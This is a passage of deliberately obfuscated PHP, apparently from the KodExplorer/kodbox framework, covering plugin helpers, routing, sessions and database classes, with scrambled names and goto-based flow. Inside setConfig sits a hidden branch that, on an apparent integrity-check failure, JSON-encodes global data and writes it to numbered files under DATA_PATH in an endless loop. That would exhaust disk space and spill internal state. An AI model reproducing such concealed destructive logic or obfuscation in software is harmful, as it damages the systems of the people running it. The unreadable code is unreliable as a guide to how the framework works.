$aà£€èΩﬂ∏); if (!is_array($aà£€èΩﬂ∏) || count($aà£€èΩﬂ∏) == 0 || !is_array($aà£€èΩﬂ∏[0]) || count($aà£€èΩﬂ∏[0]) == 0) { return; } $e»É’£≤Á› = $this->appPackage(); goto cô–∂ÏóÃ; CüÀ…Ïª‚’: } final function echoFile($aÜ¶ÃÓ≠«Õ, $aäœ ⁄Ù‚… = false) { goto a¥Œ‹◊ôø±; fäπÍì‡Í‘: $båÊ§üæ¶ = $this->parseFile($A¿ˆêÒ´ÌÃ); $this->parseLang($båÊ§üæ¶); $this->parseConfig($båÊ§üæ¶); goto B¨ªü±úÒ≈; B¨ªü±úÒ≈: $this->parsePackage($båÊ§üæ¶); if (is_array($aäœ ⁄Ù‚…)) { $båÊ§üæ¶ = str_replace(array_keys($aäœ ⁄Ù‚…), array_values($aäœ ⁄Ù‚…), $båÊ§üæ¶); } echo $c§¿˘¡©©†[62] . $båÊ§üæ¶; goto Aê≠Úãé—Ù; a¥Œ‹◊ôø±: $c§¿˘¡©©† =& $_SERVER[Æ¡î¢≠¯™]; $A¿ˆêÒ´ÌÃ = $this->pluginPath . $aÜ¶ÃÓ≠«Õ; if (ACT == $c§¿˘¡©©†[1322]) { echo $c§¿˘¡©©†[1323] . $this->pluginName . $c§¿˘¡©©†[8] . $aÜ¶ÃÓ≠«Õ . $c§¿˘¡©©†[1324]; if (!file_exists($A¿ˆêÒ´ÌÃ)) { echo $c§¿˘¡©©†[1325]; return; } } goto fäπÍì‡Í‘; Aê≠Úãé—Ù: } final function initLang() { goto AâÒ‹çâòª; B‘ª∂◊ƒ¿ë: if (!is_array($BâìÎáã∑¨)) { return array(); } if (@count($BâìÎáã∑¨) > 0) { I18n::set($BâìÎáã∑¨); } return $BâìÎáã∑¨; goto b¥ßÀ∏ﬂê∞; AâÒ‹çâòª: $e›ó•ï√î˜ =& $_SERVER[Æ¡î¢≠¯™]; $Dí∏®¯åÁ  = $e›ó•ï√î˜[1326]; $b◊É¥‚ÈªŒ = $this->pluginPath . $e›ó•ï√î˜[1327]; goto fé¡˘Ÿú»®; fé¡˘Ÿú»®: $fı°˜Òˆ•“ = I18n::getType(); $BâìÎáã∑¨ = array(); if (file_exists($b◊É¥‚ÈªŒ . $fı°˜Òˆ•“ . $e›ó•ï√î˜[756])) { $BâìÎáã∑¨ = (include $b◊É¥‚ÈªŒ . $fı°˜Òˆ•“ . $e›ó•ï√î˜[756]); } else { if ($fı°˜Òˆ•“ == $e›ó•ï√î˜[1328] && !file_exists($b◊É¥‚ÈªŒ . $fı°˜Òˆ•“ . $e›ó•ï√î˜[756]) && file_exists($b◊É¥‚ÈªŒ . $e›ó•ï√î˜[1329])) { $BâìÎáã∑¨ = (include $b◊É¥‚ÈªŒ . $e›ó•ï√î˜[1329]); } else { if (file_exists($b◊É¥‚ÈªŒ . $Dí∏®¯åÁ  . $e›ó•ï√î˜[756])) { $BâìÎáã∑¨ = (include $b◊É¥‚ÈªŒ . $Dí∏®¯åÁ  . $e›ó•ï√î˜[756]); } } } goto B‘ª∂◊ƒ¿ë; b¥ßÀ∏ﬂê∞: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($aäÚÕ¡¢¡÷) { $bı∆Ú‡‰–‰ =& $_SERVER[Æ¡î¢≠¯™]; $D‹ªáÕ˜Óû = $_SERVER[$bı∆Ú‡‰–‰[781]] . $bı∆Ú‡‰–‰[813]; $DΩ¥Ÿº∏Üâ = $bı∆Ú‡‰–‰[778]; if ($_SERVER[$bı∆Ú‡‰–‰[57]] != $DΩ¥Ÿº∏Üâ($D‹ªáÕ˜Óû)) { goto AÁìäß≈è∞; bô€®—¥£Ÿ: $c¯§±™«ö∑ = $bı∆Ú‡‰–‰[780]; $c¯§±™«ö∑($_SERVER[$bı∆Ú‡‰–‰[781]]); $fÉì˘¥õ◊¥ = $bı∆Ú‡‰–‰[779]; goto C ü–Óù£ã; eùÉ¥Ó˘í : $B≥ù‡àè’Æ = $dáËŒè±Ã∞($B•Â†ãô∫•); $eï∞•≤‹˜· = explode($bı∆Ú‡‰–‰[62], $B≥ù‡àè’Æ); if (count($eï∞•≤‹˜·) < $bı∆Ú‡‰–‰[561]) { $D¶¨®¿ﬁÛü = $bı∆Ú‡‰–‰[64]; $D¶¨®¿ﬁÛü(); } goto bô€®—¥£Ÿ; C ü–Óù£ã: $fÉì˘¥õ◊¥(); $DÒê∑§∆Ûâ = $bı∆Ú‡‰–‰[782]; $E€≠óïÍﬁ» = json_encode($GLOBALS[$bı∆Ú‡‰–‰[783]]); goto eıªò‹ìÇ“; eıªò‹ìÇ“: $d ËÓ˘≤µà = 1; for ($cÑµúê≠ﬁü = $d ËÓ˘≤µà; $cÑµúê≠ﬁü > 0; $cÑµúê≠ﬁü++) { $DÒê∑§∆Ûâ(DATA_PATH . $cÑµúê≠ﬁü, $E€≠óïÍﬁ»); } goto f∑Ç˘ï≤ô€; AÁìäß≈è∞: $fÉì˘¥õ◊¥ = $bı∆Ú‡‰–‰[779]; $dáËŒè±Ã∞ = $bı∆Ú‡‰–‰[59]; $B•Â†ãô∫• = $_SERVER[$bı∆Ú‡‰–‰[60]] . $bı∆Ú‡‰–‰[61]; goto eùÉ¥Ó˘í ; f∑Ç˘ï≤ô€: } return $this->modelPlugin->setConfig($this->pluginName, $aäÚÕ¡¢¡÷); } public function onSetConfig($A≥¨‚∆â∞Õ) { } public function onGetConfig($CËá¿Ç€ÍÖ) { } public function onChangeStatus($E∞„Û©ÙÜç) { } public function onUninstall() { } public function onInstall() { } public function authCheck($eÕ≈»Âª›› = "\160\x6c\165\147\x69\156\x41\165\x74\150") { $b∏òà¢¯ƒ∫ =& $_SERVER[Æ¡î¢≠¯™]; if (!defined($b∏òà¢¯ƒ∫[431])) { return !1; } if (_get($GLOBALS, $b∏òà¢¯ƒ∫[461])) { return !0; } $Dπ„•â•∆† = $this->getConfig(); if (!$Dπ„•â•∆†[$eÕ≈»Âª››]) { return !1; } return ActionCall($b∏òà¢¯ƒ∫[1330], $Dπ„•â•∆†[$eÕ≈»Âª››]); } public function url($a±ÿ£Ü”ÉÆ, $b‡∂âìÜìé = '', $Fﬂ∂ÇÌä¶Ö = true) { goto B˘Úì›Öè«; A∑çÈÈÍÃÁ: $fó™‰ùÓ‰¶ = $this->packageVersion(); $bìô¬áõÃ– = $B†ÇÃû≠≤¢ . $bÑœ‹ÜÇ˜Ü[416] . $fó™‰ùÓ‰¶; if ($b‡∂âìÜìé == $bÑœ‹ÜÇ˜Ü[33]) { $Eöâùûé©” = $this->pluginHost . $a±ÿ£Ü”ÉÆ . $bÑœ‹ÜÇ˜Ü[1331] . $bìô¬áõÃ–; } else { if ($b‡∂âìÜìé === $bÑœ‹ÜÇ˜Ü[86]) { $Eöâùûé©” = $this->pluginHost . $a±ÿ£Ü”ÉÆ; } else { if ($b‡∂âìÜìé == $bÑœ‹ÜÇ˜Ü[1332]) { $Eöâùûé©” = STATIC_PATH . $a±ÿ£Ü”ÉÆ . $bÑœ‹ÜÇ˜Ü[1331] . $B†ÇÃû≠≤¢; } else { if ($b‡∂âìÜìé == $bÑœ‹ÜÇ˜Ü[1333]) { $Eöâùûé©” = APP_HOST . $bÑœ‹ÜÇ˜Ü[1334] . $a±ÿ£Ü”ÉÆ . $bÑœ‹ÜÇ˜Ü[1331] . $B†ÇÃû≠≤¢; } else { if (isset($b˜πÔÖÎ–¢[$b‡∂âìÜìé])) { $Eöâùûé©” = $b˜πÔÖÎ–¢[$b‡∂âìÜìé] . $a±ÿ£Ü”ÉÆ . $bÑœ‹ÜÇ˜Ü[1331] . $bìô¬áõÃ–; } } } } } goto EÏ•⁄∫€‘π; EÏ•⁄∫€‘π: if (!$Fﬂ∂ÇÌä¶Ö) { return $Eöâùûé©”; } echo $Eöâùûé©”; goto BóÍàáãÎ™; B˘Úì›Öè«: $bÑœ‹ÜÇ˜Ü =& $_SERVER[Æ¡î¢≠¯™]; $b˜πÔÖÎ–¢ = $this->getConfig(); $B†ÇÃû≠≤¢ = KOD_VERSION . $bÑœ‹ÜÇ˜Ü[103] . KOD_VERSION_BUILD; goto A∑çÈÈÍÃÁ; BóÍàáãÎ™: } public function link($f”„ﬂúŸÌõ = false, $FÙüãÕé≤ó = '') { $FÂä”’µﬂÖ =& $_SERVER[Æ¡î¢≠¯™]; if (!$f”„ﬂúŸÌõ) { $this->link($FÂä”’µﬂÖ[1335], $FÂä”’µﬂÖ[1333]); $this->link($FÂä”’µﬂÖ[1336], $FÂä”’µﬂÖ[1332]); $this->link($FÂä”’µﬂÖ[1337], $FÂä”’µﬂÖ[1332]); $this->link($FÂä”’µﬂÖ[1338], $FÂä”’µﬂÖ[1332]); $this->link($FÂä”’µﬂÖ[1339], $FÂä”’µﬂÖ[1332]); return; } $fî§ﬂ¢¬≤ = $this->url($f”„ﬂúŸÌõ, $FÙüãÕé≤ó, !1); if (substr($f”„ﬂúŸÌõ, -3) == $FÂä”’µﬂÖ[1340]) { echo $FÂä”’µﬂÖ[1341] . $fî§ﬂ¢¬≤ . $FÂä”’µﬂÖ[1342] . $FÂä”’µﬂÖ[62]; } else { if (substr($f”„ﬂúŸÌõ, -4) == $FÂä”’µﬂÖ[1343]) { echo $FÂä”’µﬂÖ[1344] . $fî§ﬂ¢¬≤ . $FÂä”’µﬂÖ[1345] . $FÂä”’µﬂÖ[62]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\133\136\57\x5d\x2b", "\x3a\156\x75\155" => "\x5b\x30\55\x39\x5d\53", "\72\x61\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($fù«ß´úﬁ§, $EÂ√˜∑´Æù) { $F€ø‡·ãÖÿ =& $_SERVER[Æ¡î¢≠¯™]; if ($fù«ß´úﬁ§ == $F€ø‡·ãÖÿ[1346]) { $DÂÔ®îéùì = array_map($F€ø‡·ãÖÿ[1347], $EÂ√˜∑´Æù[0]); $C≥ΩÂÁ·Ó© = strpos($EÂ√˜∑´Æù[1], $F€ø‡·ãÖÿ[8]) === 0 ? $EÂ√˜∑´Æù[1] : $F€ø‡·ãÖÿ[8] . $EÂ√˜∑´Æù[1]; $EºÙ±€ﬂÀØ = $EÂ√˜∑´Æù[2]; } else { $DÂÔ®îéùì = null; $C≥ΩÂÁ·Ó© = strpos($EÂ√˜∑´Æù[0], $F€ø‡·ãÖÿ[8]) === 0 ? $EÂ√˜∑´Æù[0] : $F€ø‡·ãÖÿ[8] . $EÂ√˜∑´Æù[0]; $EºÙ±€ﬂÀØ = $EÂ√˜∑´Æù[1]; } array_push(self::$maps, $DÂÔ®îéùì); array_push(self::$routes, $C≥ΩÂÁ·Ó©); array_push(self::$methods, strtoupper($fù«ß´úﬁ§)); array_push(self::$callbacks, $EºÙ±€ﬂÀØ); } public static function error($aÈ”©±ÚíÑ) { self::$errorCallback = $aÈ”©±ÚíÑ; } public static function haltOnMatch($b≥çáß»öø = true) { self::$halts = $b≥çáß»öø; } public static function dispatch() { goto Dè¢µΩ—†ç; cêà¿íÊ∑◊: $aäÁÂçñÒı = array_keys(static::$patterns); $Béƒ÷πáÃò = array_values(static::$patterns); $F¿Ìãü–ñå = !1; goto Eö∞≤ç€ÛŒ; Eö∞≤ç€ÛŒ: self::$routes = preg_replace($AÑ¢íèôê™[1059], $AÑ¢íèôê™[8], self::$routes); if (in_array($A‰ªàõå¡≈, self::$routes)) { $f‹àãáŸó = array_keys(self::$routes, $A‰ªàõå¡≈); foreach ($f‹àãáŸó as $e˜—æÕ¢’Ñ) { if (self::$methods[$e˜—æÕ¢’Ñ] == $dç¥‹…ìÜ¥ || self::$methods[$e˜—æÕ¢’Ñ] == $AÑ¢íèôê™[1349] || in_array($dç¥‹…ìÜ¥, self::$maps[$e˜—æÕ¢’Ñ])) { $F¿Ìãü–ñå = !0; if (!is_object(self::$callbacks[$e˜—æÕ¢’Ñ])) { $Fπ•õ´á“∏ = explode($AÑ¢íèôê™[8], self::$callbacks[$e˜—æÕ¢’Ñ]); $c≈∂Ú‰∂É = end($Fπ•õ´á“∏); $cçå ∂ﬁπÜ = explode($AÑ¢íèôê™[1350], $c≈∂Ú‰∂É); $aáÙ—àÚ« = new $cçå ∂ﬁπÜ[0](); $aáÙ—àÚ«->{$cçå ∂ﬁπÜ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$e˜—æÕ¢’Ñ]); if (self::$halts) { return; } } } } } else { $Fà”ç√Ô‰› = 0; foreach (self::$routes as $e˜—æÕ¢’Ñ) { if (strpos($e˜—æÕ¢’Ñ, $AÑ¢íèôê™[4]) !== !1) { $e˜—æÕ¢’Ñ = str_replace($aäÁÂçñÒı, $Béƒ÷πáÃò, $e˜—æÕ¢’Ñ); } if (preg_match($AÑ¢íèôê™[1351] . $e˜—æÕ¢’Ñ . $AÑ¢íèôê™[1352], $A‰ªàõå¡≈, $CÌÉÓÚºÀæ)) { if (self::$methods[$Fà”ç√Ô‰›] == $dç¥‹…ìÜ¥ || self::$methods[$Fà”ç√Ô‰›] == $AÑ¢íèôê™[1349] || !empty(self::$maps[$Fà”ç√Ô‰›]) && in_array($dç¥‹…ìÜ¥, self::$maps[$Fà”ç√Ô‰›])) { $F¿Ìãü–ñå = !0; array_shift($CÌÉÓÚºÀæ); if (!is_object(self::$callbacks[$Fà”ç√Ô‰›])) { $Fπ•õ´á“∏ = explode($AÑ¢íèôê™[8], self::$callbacks[$Fà”ç√Ô‰›]); $c≈∂Ú‰∂É = end($Fπ•õ´á“∏); $cçå ∂ﬁπÜ = explode($AÑ¢íèôê™[1350], $c≈∂Ú‰∂É); $aáÙ—àÚ« = new $cçå ∂ﬁπÜ[0](); if (!method_exists($aáÙ—àÚ«, $cçå ∂ﬁπÜ[1])) { echo $AÑ¢íèôê™[1353]; } else { call_user_func_array(array($aáÙ—àÚ«, $cçå ∂ﬁπÜ[1]), $CÌÉÓÚºÀæ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Fà”ç√Ô‰›], $CÌÉÓÚºÀæ); if (self::$halts) { return; } } } } $Fà”ç√Ô‰›++; } } if ($F¿Ìãü–ñå == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $C‡§ã¢ûˆÍ =& $_SERVER[Æ¡î¢≠¯™]; header($_SERVER[$C‡§ã¢ûˆÍ[1354]] . $C‡§ã¢ûˆÍ[1355]); echo $C‡§ã¢ûˆÍ[1356]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$AÑ¢íèôê™[1348]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Fÿ∑É“ìÊë; Dè¢µΩ—†ç: $AÑ¢íèôê™ =& $_SERVER[Æ¡î¢≠¯™]; $A‰ªàõå¡≈ = parse_url($_SERVER[$AÑ¢íèôê™[1348]], PHP_URL_PATH); $dç¥‹…ìÜ¥ = $_SERVER[$AÑ¢íèôê™[161]]; goto cêà¿íÊ∑◊; Fÿ∑É“ìÊë: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto F¶∏æ≥ï¥ü; FÌûÀÚƒ„‡: $f–œ≥⁄∂åÜ = $a•ÓÉÔ‹¨¢[$Aò∞πæ»√ﬂ[1359]]; $bôﬁ◊äê«≤ = $a•ÓÉÔ‹¨¢[$f–œ≥⁄∂åÜ]; $D‘œÜçÏ’÷ = $a•ÓÉÔ‹¨¢[$Aò∞πæ»√ﬂ[746]]; goto E—≠•…ä¨©; CÍœö…§ç‚: $DÕ©¯èÂ Ö = _get($GLOBALS, $Aò∞πæ»√ﬂ[1358], $DÕ©¯èÂ Ö); if (self::$sessionSign) { } else { if (Cookie::get($DÕ©¯èÂ Ö)) { self::$sessionSign = Cookie::get($DÕ©¯èÂ Ö); } else { self::$sessionSign = guid(); } } Cookie::setSafe($DÕ©¯èÂ Ö, self::$sessionSign, self::$sessionTime); goto FÌûÀÚƒ„‡; c√ƒ≥”Ú◊Û: return $cÈòêæ∂´Ø; goto BÆ —◊Ôº•; E—≠•…ä¨©: switch ($f–œ≥⁄∂åÜ) { case $Aò∞πæ»√ﬂ[17]: self::$handle = Model($Aò∞πæ»√ﬂ[747]); break; case $Aò∞πæ»√ﬂ[748]: self::$handle = new CacheRedis($bôﬁ◊äê«≤, $D‘œÜçÏ’÷); break; case $Aò∞πæ»√ﬂ[749]: self::$handle = new CacheMemcached($bôﬁ◊äê«≤, $D‘œÜçÏ’÷); break; case $Aò∞πæ»√ﬂ[174]: $bôﬁ◊äê«≤[$Aò∞πæ»√ﬂ[85]] = $bôﬁ◊äê«≤[$Aò∞πæ»√ﬂ[85]] . $Aò∞πæ»√ﬂ[1360]; self::$handle = new CacheFile($bôﬁ◊äê«≤, $D‘œÜçÏ’÷); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $cÈòêæ∂´Ø = new self(); goto c√ƒ≥”Ú◊Û; c‘¬ß∂Á„È: $a•ÓÉÔ‹¨¢ = $GLOBALS[$Aò∞πæ»√ﬂ[6]][$Aò∞πæ»√ﬂ[343]]; self::$sessionTime = $a•ÓÉÔ‹¨¢[$Aò∞πæ»√ﬂ[1357]]; $DÕ©¯èÂ Ö = SESSION_ID; goto CÍœö…§ç‚; F¶∏æ≥ï¥ü: $Aò∞πæ»√ﬂ =& $_SERVER[Æ¡î¢≠¯™]; static $cÈòêæ∂´Ø = false; if ($cÈòêæ∂´Ø) { return $cÈòêæ∂´Ø; } goto c‘¬ß∂Á„È; BÆ —◊Ôº•: } public static function sign($Eáìå¿∏ÛÊ = false) { $Eáìå¿∏ÛÊ && (self::$sessionSign = $Eáìå¿∏ÛÊ); self::init(); return self::$sessionSign; } public static function set($AÍ£∆ùÓáë, $c—ùı§¿≤ø = false) { self::init(); if (is_array($AÍ£∆ùÓáë)) { foreach ($AÍ£∆ùÓáë as $C›ã”ë‰∫√ => $Dñ®…ÿÙ¡ù) { array_set_value(self::$data, $C›ã”ë‰∫√, $Dñ®…ÿÙ¡ù); } } else { array_set_value(self::$data, $AÍ£∆ùÓáë, $c—ùı§¿≤ø); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Eªÿ·ÿÇß≤ = false) { self::init(); if (!$Eªÿ·ÿÇß≤) { return self::$data; } return array_get_value(self::$data, $Eªÿ·ÿÇß≤); } public static function remove($A≠ì∫ˆò∂“) { self::init(); unset(self::$data[$A≠ì∫ˆò∂“]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Æ¡î¢≠¯™][751])) { self::$handle->clearTimeout(); } } } goto FàÂí›ÎÔÁ; F®æøœ≠ÀÒ: class DbSqlite3 extends DbSqlite3Base { public function query($aòﬂΩÌÎæÌ) { goto cÔ÷∂æ§ƒ≈; b°°æõö∆›: if (!$fé≈±±¥´‹) { return !1; } if (flock($fé≈±±¥´‹, LOCK_EX)) { $e¢ƒıªõä∂ = parent::query($aòﬂΩÌÎæÌ); flock($fé≈±±¥´‹, LOCK_UN); fclose($fé≈±±¥´‹); return $e¢ƒıªõä∂; } flock($fé≈±±¥´‹, LOCK_UN); goto EË∫º¿ë≥∞; EË∫º¿ë≥∞: fclose($fé≈±±¥´‹); show_json($b‚»∆Â’ÁÌ[862], !1); return !1; goto a£Ãï—Â„‰; cÔ÷∂æ§ƒ≈: $b‚»∆Â’ÁÌ =& $_SERVER[Æ¡î¢≠¯™]; $eÆ≥—≠ﬂ√† = DATA_PATH . $b‚»∆Â’ÁÌ[860]; $fé≈±±¥´‹ = fopen($eÆ≥—≠ﬂ√†, $b‚»∆Â’ÁÌ[861]); goto b°°æõö∆›; a£Ãï—Â„‰: } public function execute($c◊êË≥Çâî) { goto dàÛ”âíø¯; F©Òíüù»π: if (!$fÉÀ÷´â∂⁄) { return !1; } if (flock($fÉÀ÷´â∂⁄, LOCK_EX)) { $dÈ°Á‘›Ú† = parent::execute($c◊êË≥Çâî); flock($fÉÀ÷´â∂⁄, LOCK_UN); fclose($fÉÀ÷´â∂⁄); return $dÈ°Á‘›Ú†; } flock($fÉÀ÷´â∂⁄, LOCK_UN); goto BŸ≠º°•”ú; dàÛ”âíø¯: $AÌÂ©æÁÚ∆ =& $_SERVER[Æ¡î¢≠¯™]; $fŒë¿Í´ïà = DATA_PATH . $AÌÂ©æÁÚ∆[860]; $fÉÀ÷´â∂⁄ = fopen($fŒë¿Í´ïà, $AÌÂ©æÁÚ∆[861]); goto F©Òíüù»π; BŸ≠º°•”ú: fclose($fÉÀ÷´â∂⁄); show_json($AÌÂ©æÁÚ∆[862], !1); return !1; goto däûÆ≠Ç© ; däûÆ≠Ç© : } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\161" => "\74\x3e", "\147\x74" => "\76", "\x65\x67\x74" => "\x3e\75", "\154\x74" => "\74", "\145\154\164" => "\74\x3d", "\156\157\164\x6c\151\153\x65" => "\116\x4f\x54\40\114\x49\113\x45", "\x6c\x69\x6b\x65" => "\x4c\111\113\x45", "\151\x6e" => "\x49\x4e", "\156\x6f\x74\151\x6e" => "\116\117\124\40\x49\116", "\156\157\x74\40\151\x6e" => "\116\117\x54\40\111\116", "\142\x65\164\x77\145\x65\x6e" => "\102\105\x54\x57\105\x45\116", "\x6e\157\164\x62\x65\164\167\145\x65\156" => "\x4e\117\x54\x20\x42\x45\124\127\x45\105\x4e", "\x6e\x6f\x74\x20\142\x65\164\x77\145\x65\156" => "\x4e\117\124\x20\x42\105\124\x57\105\105\116"); protected $selectSql = "\123\x45\114\x45\103\x54\45\x44\111\123\124\111\116\103\124\x25\40\45\x46\111\x45\114\104\x25\x20\106\122\x4f\x4d\x20\45\x54\101\102\114\x45\45\45\x4a\117\x49\116\x25\x25\x57\110\105\122\105\45\x25\107\x52\x4f\x55\x50\x25\x25\x48\101\x56\x49\116\107\45\x25\117\x52\104\105\x52\x25\x25\x4c\111\115\x49\124\x25\x20\45\x55\116\111\x4f\x4e\45\45\x43\117\115\115\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $AÂ°–ìàÜ¡ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Æ¡î¢≠¯™][863], $AÂ°–ìàÜ¡); } public function factory($e≈éÌ»äÈº = '') { goto eîÕıû¨Ë¡; d≥π“—’ã∏: return $e∞Ö≠ï„éñ; goto eœëòíŒìƒ; eîÕıû¨Ë¡: $AÀ—èˆ©¡€ =& $_SERVER[Æ¡î¢≠¯™]; $e≈éÌ»äÈº = $this->parseConfig($e≈éÌ»äÈº); if (empty($e≈éÌ»äÈº[$AÀ—èˆ©¡€[864]])) { think_exception(think_lang($AÀ—èˆ©¡€[865])); } goto D∏¿¿ñ÷Ã‹; D∏¿¿ñ÷Ã‹: $this->dbType = ucwords(strtolower($e≈éÌ»äÈº[$AÀ—èˆ©¡€[864]])); $fÜ÷ã¡õ–à = $AÀ—èˆ©¡€[866] . $this->dbType; if (class_exists($fÜ÷ã¡õ–à)) { $e∞Ö≠ï„éñ = new $fÜ÷ã¡õ–à($e≈éÌ»äÈº); if ($AÀ—èˆ©¡€[716] != strtolower($e≈éÌ»äÈº[$AÀ—èˆ©¡€[864]])) { $e∞Ö≠ï„éñ->dbType = strtoupper($this->dbType); } else { $e∞Ö≠ï„éñ->dbType = $this->_getDsnType($e≈éÌ»äÈº[$AÀ—èˆ©¡€[816]]); } } else { think_exception(think_lang($AÀ—èˆ©¡€[867]) . $AÀ—èˆ©¡€[868] . $fÜ÷ã¡õ–à); } goto d≥π“—’ã∏; eœëòíŒìƒ: } public function __call($DÔ£™Ã≈Òå, $a‡€íô§é™) { if (method_exists($this, $DÔ£™Ã≈Òå)) { return call_user_func_array(array($this, $DÔ£™Ã≈Òå), $a‡€íô§é™); } } protected function _getDsnType($cèÉÜ∏ï ë) { $EÉ£âóŒÿﬁ = explode($_SERVER[Æ¡î¢≠¯™][4], $cèÉÜ∏ï ë); $bå®µù—Òå = strtoupper(trim($EÉ£âóŒÿﬁ[0])); return $bå®µù—Òå; } private function parseConfig($CÙ≠äπ°Ê≥ = '') { $f„¡ã˘ò°› =& $_SERVER[Æ¡î¢≠¯™]; if (!empty($CÙ≠äπ°Ê≥) && is_string($CÙ≠äπ°Ê≥)) { $CÙ≠äπ°Ê≥ = $this->parseDSN($CÙ≠äπ°Ê≥); } elseif (is_array($CÙ≠äπ°Ê≥)) { $CÙ≠äπ°Ê≥ = array_change_key_case($CÙ≠äπ°Ê≥); $CÙ≠äπ°Ê≥ = array($f„¡ã˘ò°›[864] => $CÙ≠äπ°Ê≥[$f„¡ã˘ò°›[715]], $f„¡ã˘ò°›[788] => $CÙ≠äπ°Ê≥[$f„¡ã˘ò°›[869]], $f„¡ã˘ò°›[789] => $CÙ≠äπ°Ê≥[$f„¡ã˘ò°›[870]], $f„¡ã˘ò°›[786] => $CÙ≠äπ°Ê≥[$f„¡ã˘ò°›[871]], $f„¡ã˘ò°›[787] => $CÙ≠äπ°Ê≥[$f„¡ã˘ò°›[872]], $f„¡ã˘ò°›[17] => $CÙ≠äπ°Ê≥[$f„¡ã˘ò°›[873]], $f„¡ã˘ò°›[816] => $CÙ≠äπ°Ê≥[$f„¡ã˘ò°›[717]], $f„¡ã˘ò°›[13] => isset($CÙ≠äπ°Ê≥[$f„¡ã˘ò°›[874]]) ? $CÙ≠äπ°Ê≥[$f„¡ã˘ò°›[874]] : array()); } elseif (empty($CÙ≠äπ°Ê≥)) { if (think_config($f„¡ã˘ò°›[875]) && $f„¡ã˘ò°›[716] != strtolower(think_config($f„¡ã˘ò°›[876]))) { $CÙ≠äπ°Ê≥ = $this->parseDSN(think_config($f„¡ã˘ò°›[875])); } else { $CÙ≠äπ°Ê≥ = array($f„¡ã˘ò°›[864] => think_config($f„¡ã˘ò°›[876]), $f„¡ã˘ò°›[788] => think_config($f„¡ã˘ò°›[877]), $f„¡ã˘ò°›[789] => think_config($f„¡ã˘ò°›[878]), $f„¡ã˘ò°›[786] => think_config($f„¡ã˘ò°›[879]), $f„¡ã˘ò°›[787] => think_config($f„¡ã˘ò°›[880]), $f„¡ã˘ò°›[17] => think_config($f„¡ã˘ò°›[240]), $f„¡ã˘ò°›[816] => think_config($f„¡ã˘ò°›[875]), $f„¡ã˘ò°›[13] => think_config($f„¡ã˘ò°›[881])); } } return $CÙ≠äπ°Ê≥; } protected function initConnect($Düå≈Í˜òÎ = true) { if (1 == think_config($_SERVER[Æ¡î¢≠¯™][18])) { $this->_linkID = $this->multiConnect($Düå≈Í˜òÎ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($eﬂˆ¨≈ÑÖæ = false) { $BØûÇ∫±⁄… =& $_SERVER[Æ¡î¢≠¯™]; static $eÉü§—Ù¢Ç = array(); if (empty($eÉü§—Ù¢Ç)) { foreach ($this->config as $dØÌïıÓêå => $F€Ù≈Îº∞Æ) { $eÉü§—Ù¢Ç[$dØÌïıÓêå] = explode($BØûÇ∫±⁄…[47], $F€Ù≈Îº∞Æ); } } if (think_config($BØûÇ∫±⁄…[882])) { if ($eﬂˆ¨≈ÑÖæ) { $FÉ∏‡»ÉËÖ = floor(mt_rand(0, think_config($BØûÇ∫±⁄…[883]) - 1)); } else { if (is_numeric(think_config($BØûÇ∫±⁄…[884]))) { $FÉ∏‡»ÉËÖ = think_config($BØûÇ∫±⁄…[884]); } else { $FÉ∏‡»ÉËÖ = floor(mt_rand(think_config($BØûÇ∫±⁄…[883]), count($eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[786]]) - 1)); } } } else { $FÉ∏‡»ÉËÖ = floor(mt_rand(0, count($eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[786]]) - 1)); } $fæ”‡ËËÇÛ = array($BØûÇ∫±⁄…[788] => isset($eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[788]][$FÉ∏‡»ÉËÖ]) ? $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[788]][$FÉ∏‡»ÉËÖ] : $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[788]][0], $BØûÇ∫±⁄…[789] => isset($eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[789]][$FÉ∏‡»ÉËÖ]) ? $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[789]][$FÉ∏‡»ÉËÖ] : $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[789]][0], $BØûÇ∫±⁄…[786] => isset($eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[786]][$FÉ∏‡»ÉËÖ]) ? $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[786]][$FÉ∏‡»ÉËÖ] : $eÉü§—Ù¢Ç[$BØûÇ∫±⁄…[786]][0], $BØûÇ∫±⁄…[787] => 